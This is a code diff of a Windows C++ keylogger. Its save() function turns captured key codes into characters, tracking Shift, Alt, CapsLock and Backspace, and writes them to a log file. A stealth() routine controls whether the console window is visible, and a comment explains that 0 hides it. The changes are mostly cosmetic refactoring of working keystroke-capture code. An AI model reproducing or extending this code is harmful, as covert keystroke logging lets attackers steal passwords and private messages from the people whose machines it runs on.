@@ -17,12 +17,16 @@
 #include <windows.h>
 #include <fstream>
 #include <string>
+#include <cstdlib>
+#include <cstdio>
 #include <time.h>
 
-bool is_capslock = false;
-int backspace = 0; //Backspace variable
+//using namespace std;
 
-int save(int key)
+bool is_capslock = false;
+int backspace = 0; 
+
+int save(const int key)
 {
 	//Write log
 	std::ofstream out_file;
@@ -32,51 +36,51 @@ int save(int key)
 	
 	switch (key)
 	{
-		//Numeric keyboard
+	//Numeric keyboard
 	case 96:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "0";
 		break;
 	case 97:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "1";
 		break;
 	case 98:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "2";
 		break;
 	case 99:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "3";
 		break;
 	case 100:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "4";
 		break;
 	case 101:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "5";
 		break;
 	case 102:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "6";
 		break;
 	case 103:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "7";
 		break;
 	case 104:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "8";
 		break;
 	case 105:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "9";
 		break;
 
-		//Top keyboard
+	//Top keyboard
 	case 48:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += ")";
@@ -87,7 +91,7 @@ int save(int key)
 		}
 		break;
 	case 49:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "!";
@@ -98,7 +102,7 @@ int save(int key)
 		}
 		break;
 	case 50:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "@";
@@ -109,7 +113,7 @@ int save(int key)
 		}
 		break;
 	case 51:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "#";
@@ -120,7 +124,7 @@ int save(int key)
 		}
 		break;
 	case 52:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "$";
@@ -131,7 +135,7 @@ int save(int key)
 		}
 		break;
 	case 53:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "%";
@@ -142,7 +146,7 @@ int save(int key)
 		}
 		break;
 	case 54:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "^";
@@ -153,7 +157,7 @@ int save(int key)
 		}
 		break;
 	case 55:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "&";
@@ -164,7 +168,7 @@ int save(int key)
 		}
 		break;
 	case 56:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "*";
@@ -175,7 +179,7 @@ int save(int key)
 		}
 		break;
 	case 57:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "(";
@@ -186,9 +190,9 @@ int save(int key)
 		}
 		break;
 
-		//Inputting a set of letters from the keyboard
+	//Inputting a set of letters from the keyboard
 	case 65:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			if (GetAsyncKeyState(VK_MENU))
@@ -213,7 +217,7 @@ int save(int key)
 		}
 		break;
 	case 66:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "B";
@@ -224,7 +228,7 @@ int save(int key)
 		}
 		break;
 	case 67:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			if (GetAsyncKeyState(VK_MENU))
@@ -249,7 +253,7 @@ int save(int key)
 		}
 		break;
 	case 68:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "D";
@@ -260,7 +264,7 @@ int save(int key)
 		}
 		break;
 	case 69:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			if (GetAsyncKeyState(VK_MENU))
@@ -284,7 +288,7 @@ int save(int key)
 		}
 		break;
 	case 70:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "F";
@@ -295,7 +299,7 @@ int save(int key)
 		}
 		break;
 	case 71:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "G";
@@ -306,7 +310,7 @@ int save(int key)
 		}
 		break;
 	case 72:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "H";
@@ -317,7 +321,7 @@ int save(int key)
 		}
 		break;
 	case 73:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "I";
@@ -328,7 +332,7 @@ int save(int key)
 		}
 		break;
 	case 74:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "J";
@@ -339,7 +343,7 @@ int save(int key)
 		}
 		break;
 	case 75:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) 
 		{
 			sLogs += "K";
@@ -350,7 +354,7 @@ int save(int key)
 		}
 		break;
 	case 76:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) 
 		{
 			if (GetAsyncKeyState(VK_MENU)) 
@@ -375,7 +379,7 @@ int save(int key)
 		}
 		break;
 	case 77:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "M";
@@ -386,7 +390,7 @@ int save(int key)
 		}
 		break;
 	case 78:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			if (GetAsyncKeyState(VK_MENU))
@@ -412,7 +416,7 @@ int save(int key)
 		}
 		break;
 	case 79:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) 
 		{
 			if (GetAsyncKeyState(VK_MENU)) 
@@ -438,7 +442,7 @@ int save(int key)
 		}
 		break;
 	case 80:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) 
 		{
 			sLogs += "P";
@@ -450,7 +454,7 @@ int save(int key)
 		}
 		break;
 	case 81:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "Q";
@@ -462,7 +466,7 @@ int save(int key)
 		}
 		break;
 	case 82:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "R";
@@ -474,7 +478,7 @@ int save(int key)
 		}
 		break;
 	case 83:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			if (GetAsyncKeyState(VK_MENU)) 
@@ -500,7 +504,7 @@ int save(int key)
 		}
 		break;
 	case 84:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "T";
@@ -512,7 +516,7 @@ int save(int key)
 		}
 		break;
 	case 85:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "U";
@@ -531,7 +535,7 @@ int save(int key)
 		}
 		break;
 	case 86:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "V";
@@ -543,7 +547,7 @@ int save(int key)
 		}
 		break;
 	case 87:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			sLogs += "W";
@@ -555,7 +559,7 @@ int save(int key)
 		}
 		break;
 	case 88:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) 
 		{
 			if (GetAsyncKeyState(VK_MENU)) 
@@ -580,7 +584,7 @@ int save(int key)
 		}
 		break;
 	case 89:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) 
 		{
 			sLogs += "Y";
@@ -592,7 +596,7 @@ int save(int key)
 		}
 		break;
 	case 90:
-		backspace = 0;
+		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			if (GetAsyncKeyState(VK_MENU)) 
@@ -619,51 +623,51 @@ int save(int key)
 
 	//Decimal key codes
 	case 13:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "\n";
 		break;
 	case 20:
-		backspace = 0;
-		if (is_capslock == false) 
+		::backspace = 0;
+		if (::is_capslock == false) 
 		{
-			is_capslock = true;
+			::is_capslock = true;
 			sLogs += " [CapsLock] ";
 		}
 		else
 		{
-			is_capslock = false;
+			::is_capslock = false;
 			sLogs += " [/CapsLock] ";
 		}
 		break;
 	case VK_BACK:
-		backspace += 1;
+		::backspace += 1;
 		sLogs += " [";
-		sLogs += backspace + '0';
+		sLogs += ::backspace + '0';
 		sLogs += "x";
 		sLogs += "Backspace]";
 		break;
 	case VK_SPACE:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += " ";
 		break;
 	case VK_MULTIPLY:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "*";
 		break;
 	case VK_ADD:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "+";
 		break;
 	case VK_SUBTRACT:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "-";
 		break;
 	case VK_DECIMAL:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += ".";
 		break;
 	case VK_DIVIDE:
-		backspace = 0;
+		::backspace = 0;
 		sLogs += "/";
 		break;
 	default:
@@ -681,7 +685,7 @@ void stealth()
 	HWND stealth;
 	AllocConsole();
 	stealth = FindWindowA("consoleWindowClass", NULL);
-	ShowWindow(stealth, 1); //1 - visible window, 0 - hide window
+	ShowWindow(stealth, 1); //1 - visible window, 0 - hidden window
 }
 
 int main(int argc, char *argv[]) 
@@ -702,5 +706,6 @@ int main(int argc, char *argv[])
 			}
 		}
 	}
+
 	return 0;
 }
